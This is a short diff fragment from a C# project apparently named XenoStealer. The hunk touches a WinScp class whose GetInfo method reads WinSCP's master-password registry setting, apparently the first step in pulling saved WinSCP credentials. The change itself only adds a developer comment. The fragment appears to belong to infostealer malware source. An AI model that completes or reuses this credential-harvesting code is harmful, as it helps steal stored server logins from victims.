@@ -9,7 +9,7 @@ namespace XenoStealer
 {
     public static class WinScp
     {
-        public static DataExtractionStructs.WinScpInfo[] GetInfo() 
+        public static DataExtractionStructs.WinScpInfo[] GetInfo() //copied this code from the old project too, i personally dont like it very much, but same reason as i stated below.
         {
             object hasMasterPassword=Utils.ReadRegistryKeyValue(RegistryHive.CurrentUser, "Software\\Martin Prikryl\\WinSCP 2\\Configuration\\Security", "UseMasterPassword");
             if (hasMasterPassword == null || hasMasterPassword.GetType() != typeof(int) || (int)hasMasterPassword == 1) 
